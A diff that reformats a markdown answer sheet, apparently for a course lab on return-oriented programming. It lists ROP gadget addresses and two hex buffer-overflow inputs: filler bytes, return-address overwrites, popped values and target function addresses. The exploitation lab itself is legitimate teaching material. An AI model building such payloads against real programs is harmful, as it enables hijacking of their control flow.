@@ -67,10 +67,10 @@ The `pop %rdi; ret` gadget can be found at address `0x72245b`.
 ## Question 2
 The first attack input in hex is as follows: 
 
-`ff ff ff ff ff ff ff ff //Filler bytes
- 5b 24 72 00 00 00 00 00 // Address of gadget (overwrites return address)
- 44 22 44 22 44 22 44 22 // Value for popping
- 88 77 66 55 44 33 22 11 // Address of target function`
+`ff ff ff ff ff ff ff ff //Filler bytes` <br>
+`5b 24 72 00 00 00 00 00 // Address of gadget (overwrites return address)` <br>
+`44 22 44 22 44 22 44 22 // Value for popping` <br>
+`88 77 66 55 44 33 22 11 // Address of target function` <br>
 
 ## Question 3
 The `pop %rcx; ret` gadget can be found at address `0x72243d`. 
@@ -79,11 +79,11 @@ The `movl %ecx, %esi; ret` gadget can be found at address `0x72244c`
 ## Question 4
 The second attack input in hex is as follows: 
 
-`ff ff ff ff ff ff ff ff //Filler bytes`
-`3d 24 72 00 00 00 00 00 // Address of gadget 1(overwrites return address)`
-`22 42 24 00 00 00 00 00 // Value for popping`
-`4c 24 72 00 00 00 00 00 // Address of gadget 2`
-`11 22 33 44 55 66 77 88 // Address of target function`
+`ff ff ff ff ff ff ff ff //Filler bytes` <br>
+`3d 24 72 00 00 00 00 00 // Address of gadget 1(overwrites return address)` <br>
+`22 42 24 00 00 00 00 00 // Value for popping` <br>
+`4c 24 72 00 00 00 00 00 // Address of gadget 2` <br>
+`11 22 33 44 55 66 77 88 // Address of target function` <br>
 
  Happy Attacking!
 
